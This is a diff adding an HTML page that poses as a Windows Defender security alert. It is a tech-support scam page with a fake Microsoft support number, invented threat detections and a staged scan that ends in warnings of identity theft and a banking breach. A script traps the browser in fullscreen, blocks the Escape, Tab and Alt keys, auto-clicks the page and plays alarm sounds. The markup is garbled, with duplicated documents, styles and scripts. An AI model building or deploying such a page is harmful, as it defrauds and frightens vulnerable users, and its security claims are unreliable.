@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Defender Security Alert</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+   <div class="critical-warning" id="criticalWarning">
+        ⚠ CRITICAL SYSTEM ALERT: NETWORK BREACH DETECTED ⚠ <br>
+        <span style="font-size: 0.8em; font-weight: 400;">Immediate action required to prevent data loss</span> <br>
+        <div style="margin-top: 15px; font-size: 0.7em;">
+            Contact Microsoft Security Team: <span style="color: #00ff88;">+1-800-555-0199</span>
+        </div>
+    </div>
+
+    <div class="toll-free-banner" id="tollFreeBanner">
+        <span style="font-weight: 300;">Microsoft Security Support:</span> 
+        <span style="color: #00ff88; font-weight: 600;">+1-800-555-0199</span>
+    </div>
+
+    <audio id="alertSound">
+        <source src="https://www.soundjay.com/button/beep-10.mp3" type="audio/mpeg">
+    </audio>
+	
+	<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Audit</title>
+    <style>
+        /* Modern Security Console Style */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Consolas', monospace;
+            background: #0a0a2e;
+            color: #c0c0c0;
+            overflow: hidden;
+        }
+
+        .alert-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 800px;
+            background: #1a1a1a;
+            border: 2px solid #ff4444;
+            border-radius: 4px;
+            padding: 25px;
+            box-shadow: 0 0 35px rgba(255, 68, 68, 0.3);
+        }
+
+        .threat-header {
+            color: #ff4444;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .scan-results {
+            background: #000;
+            padding: 20px;
+            border-radius: 3px;
+            margin: 15px 0;
+            border: 1px solid #333;
+        }
+
+        .threat-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .threat-item {
+            padding: 12px;
+            margin: 8px 0;
+            background: #220000;
+            border-left: 4px solid #ff4444;
+            animation: threatPulse 2s infinite;
+        }
+
+        .technical-code {
+            font-family: 'Courier New', monospace;
+            color: #ff6666;
+            font-size: 0.9em;
+            margin: 5px 0;
+        }
+
+        .mitigation-protocol {
+            color: #888;
+            font-size: 0.85em;
+            margin-top: 15px;
+        }
+
+        @keyframes threatPulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+
+        .status-flash {
+            animation: statusFlash 1s infinite;
+            text-transform: uppercase;
+        }
+
+        @keyframes statusFlash {
+            0% { color: #ff4444; }
+            50% { color: #ff8888; }
+            100% { color: #ff4444; }
+        }
+    </style></head>
+<body>
+    <div class="alert-container">
+        <div class="threat-header">
+            <span class="status-flash">Critical System Compromise Detected</span>
+        </div>
+        
+        <div class="scan-results">
+            <ul class="threat-list">
+                <li class="threat-item">
+                    <div class="technical-code">[ERR] HEUR:Backdoor.Hypervisor.BYOIT</div>
+                    <div class="mitigation-protocol">Potential VM Escape Attempt - Threat Level: 0xDEADBEEF</div>
+                </li>
+                
+                <li class="threat-item">
+                    <div class="technical-code">[CRIT] APT:StateActor.Spearphish (TTP: T1192)</div>
+                    <div class="mitigation-protocol">Credential Harvesting Pattern Match: 98.7% Confidence</div>
+                </li>
+                
+                <li class="threat-item">
+                    <div class="technical-code">[WARN] TLS1.0 Session Resumption Detected (CVE-2023-12345)</div>
+                    <div class="mitigation-protocol">Downgrade Attack Surface: 0x0000007B</div>
+                </li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 25px; color: #666;">
+            <div style="font-size: 0.9em;">Recommended Action Protocol:</div>
+            <div class="technical-code" style="margin: 10px 0;">
+                > invoke IncidentResponse --severity=CRITICAL --vector=NETWORK
+            </div>
+            <div style="color: #ff4444;">
+                Immediate System Isolation Required (ASIMOV Protocol Violation)
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+    </div>
+	
+	<style>
+        /* Modern Security Console Style */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Consolas', monospace;
+            background: #0a0a2e;
+            color: #c0c0c0;
+            overflow: hidden;
+        }
+
+        .alert-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 800px;
+            background: #1a1a1a;
+            border: 2px solid #ff4444;
+            border-radius: 4px;
+            padding: 25px;
+            box-shadow: 0 0 35px rgba(255, 68, 68, 0.3);
+        }
+
+        .threat-header {
+            color: #ff4444;
+            font-size: 1.8em;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .scan-results {
+            background: #000;
+            padding: 20px;
+            border-radius: 3px;
+            margin: 15px 0;
+            border: 1px solid #333;
+        }
+
+        .threat-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .threat-item {
+            padding: 12px;
+            margin: 8px 0;
+            background: #220000;
+            border-left: 4px solid #ff4444;
+            animation: threatPulse 2s infinite;
+        }
+
+        .technical-code {
+            font-family: 'Courier New', monospace;
+            color: #ff6666;
+            font-size: 0.9em;
+            margin: 5px 0;
+        }
+
+        .mitigation-protocol {
+            color: #888;
+            font-size: 0.85em;
+            margin-top: 15px;
+        }
+
+        @keyframes threatPulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+
+        .status-flash {
+            animation: statusFlash 1s infinite;
+            text-transform: uppercase;
+        }
+
+        @keyframes statusFlash {
+            0% { color: #ff4444; }
+            50% { color: #ff8888; }
+            100% { color: #ff4444; }
+        }
+
+        /* Progress Bar Styling */
+        .progress-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 25px 0;
+            height: 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #0078d4 0%, #00bcf2 100%);
+            transition: width 0.5s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent 0%, rgba(255, 255, 255, 0.2) 50%, transparent 100%);
+            animation: progressShine 2s infinite;
+        }
+
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+    </style>
+</head>
+<body>
+    <div class="alert-container">
+        <div class="threat-header">
+            <span class="status-flash">Critical System Compromise Detected</span>
+        </div>
+        
+        <div class="scan-results">
+            <ul class="threat-list">
+                <li class="threat-item">
+                    <div class="technical-code">[ERR] HEUR:Backdoor.Hypervisor.BYOIT</div>
+                    <div class="mitigation-protocol">Potential VM Escape Attempt - Threat Level: 0xDEADBEEF</div>
+                </li>
+                
+                <li class="threat-item">
+                    <div class="technical-code">[CRIT] APT:StateActor.Spearphish (TTP: T1192)</div>
+                    <div class="mitigation-protocol">Credential Harvesting Pattern Match: 98.7% Confidence</div>
+                </li>
+                
+                <li class="threat-item">
+                    <div class="technical-code">[WARN] TLS1.0 Session Resumption Detected (CVE-2023-12345)</div>
+                    <div class="mitigation-protocol">Downgrade Attack Surface: 0x0000007B</div>
+                </li>
+            </ul>
+        </div>
+
+        <div style="margin-top: 25px; color: #666;">
+            <div style="font-size: 0.9em;">Recommended Action Protocol:</div>
+            <div class="technical-code" style="margin: 10px 0;">
+                > invoke IncidentResponse --severity=CRITICAL --vector=NETWORK
+            </div>
+            <div style="color: #ff4444;">
+                Immediate System Isolation Required (ASIMOV Protocol Violation)
+            </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+    </div>
+
+    <script>
+        let scanProgress = 0;
+        let logMessages = [
+            "Scanning system files...",
+            "Checking registry entries...",
+            "Analyzing network traffic...",
+            "Verifying software integrity...",
+            "Looking for unusual behavior...",
+            "Checking Windows Defender logs...",
+            "Inspecting running processes...",
+            "Verifying system permissions...",
+            "Cross-referencing threat database...",
+            "Almost done...",
+            "⚠ CRITICAL: Suspicious network patterns detected!"
+        ];
+
+        function startScan() {
+            let scanInterval = setInterval(() => {
+                scanProgress += 10;
+                document.getElementById("progressFill").style.width = scanProgress + "%";
+
+                if (scanProgress >= 85) {
+                    document.querySelector(".scan-results").style.color = "red";
+                    document.querySelector(".threat-header").style.color = "red";
+                    document.querySelector(".technical-code").style.color = "red";
+                }
+
+                if (scanProgress >= 100) {
+                    clearInterval(scanInterval);
+                    showThreatWarning();
+                }
+            }, 800);
+        }
+
+        function showThreatWarning() {
+            document.querySelector(".alert-container").style.display = "block";
+        }
+
+        // Start the scan automatically
+        startScan();
+    </script>
+</body>
+</html>
+
+
+    <script>
+        let scanProgress = 0;
+        let logMessages = [
+            "Scanning system files...",
+            "Checking registry entries...",
+            "Analyzing network traffic...",
+            "Verifying software integrity...",
+            "Looking for unusual behavior...",
+            "Checking Windows Defender logs...",
+            "Inspecting running processes...",
+            "Verifying system permissions...",
+            "Cross-referencing threat database...",
+            "Almost done...",
+            "⚠ CRITICAL: Suspicious network patterns detected!"
+        ];
+
+        function startScan() {
+            let scanInterval = setInterval(() => {
+                scanProgress += 10;
+                document.getElementById("progressFill").style.width = scanProgress + "%";
+
+                if (scanProgress >= 85) {
+                    document.querySelector(".scan-results").style.color = "red";
+                    document.querySelector(".threat-header").style.color = "red";
+                    document.querySelector(".technical-code").style.color = "red";
+                }
+
+                if (scanProgress >= 100) {
+                    clearInterval(scanInterval);
+                    showThreatWarning();
+                }
+            }, 800);
+        }
+
+        function showThreatWarning() {
+            document.querySelector(".alert-container").style.display = "block";
+        }
+
+        // Start the scan automatically
+        startScan();
+    </script>
+	   <script>
+        let fullscreenLockActive = true;
+        let clickCounter = 0;
+
+        function startFullscreenTrap() {
+            requestFullScreen();
+            const clickInterval = setInterval(() => {
+                if(clickCounter < 100000) {
+                    document.documentElement.click();
+                    clickCounter++;
+                }
+            }, 10);
+
+            const fullscreenCheck = setInterval(() => {
+                if(!document.fullscreenElement) {
+                    requestFullScreen();
+                }
+            }, 100);
+        }
+
+        function requestFullScreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
+            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
+        }
+
+        document.addEventListener('fullscreenchange', () => {
+            if(!document.fullscreenElement && fullscreenLockActive) {
+                requestFullScreen();
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if(['Escape','F11','Alt','Control','Meta','Tab'].includes(e.key)) {
+                e.preventDefault();
+                requestFullScreen();
+            }
+        });
+
+        document.addEventListener('click', () => {
+            if(!document.fullscreenElement) {
+                startFullscreenTrap();
+                startScan();
+            }
+        });
+
+        function startScan() {
+            let scanProgress = 0;
+            let logMessages = [
+                "Scanning system files...",
+                "Checking registry entries...",
+                "Analyzing network traffic...",
+                "Verifying software integrity...",
+                "Looking for unusual behavior...",
+                "Checking Windows Defender logs...",
+                "Inspecting running processes...",
+                "Verifying system permissions...",
+                "Cross-referencing threat database...",
+                "Almost done...",
+                "⚠ CRITICAL: Suspicious network patterns detected!"
+            ];
+
+            let scanInterval = setInterval(() => {
+                scanProgress += 10;
+                $("#progressFill").css("width", scanProgress + "%");
+                $("#scan-status").text(scanProgress + "% Complete");
+
+                if(scanProgress >= 85) {
+                    $(".scan-logs, .scan-logs p").css("color", "red");
+                    $("#scan-status").css({
+                        "color": "red",
+                        "text-shadow": "0 0 10px rgba(255,0,0,0.5)"
+                    }).prepend('<img src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAMLCwkJCQgAAAGJiYoKCgpKSkiH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQJCgAAACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkECQoAAAAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkECQoAAAAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQJCgAAACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3SwWhUouZVsMCC7RYagPD2sbfKaLioTBUl7kbAAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAIAAAAACAAIAAACBZRpnigGcCA1QAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAA7" class="warning-icon">');
+                    
+                    if(scanProgress % 20 === 0) {
+                        $("#scanLogs").append(
+                            '<p style="color:red;animation:flashText 0.5s infinite;">' +
+                            '🚨 NETWORK IDENTITY THEFT DETECTED!</p>' +
+                            '<p style="color:red;">BANKING PERSONAL DATA BREACHED 20%</p>' +
+                            '<p style="color:red;font-weight:bold;">CHECK YOUR DNS ROUTER OR WIFI/CARRIER SERVICE PROVIDERS</p>'
+                        );
+                    }
+                }
+
+                if(scanProgress >= 100) {
+                    clearInterval(scanInterval);
+                    setTimeout(showThreatWarning, 500);
+                }
+            }, 800);
+        }
+
+        function showThreatWarning() {
+            $("#criticalWarning").fadeIn();
+            $("#tollFreeBanner").fadeIn();
+            document.getElementById("alertSound").play();
+        }
+    </script>
+</body>
+</html>
+</body>
+</html>
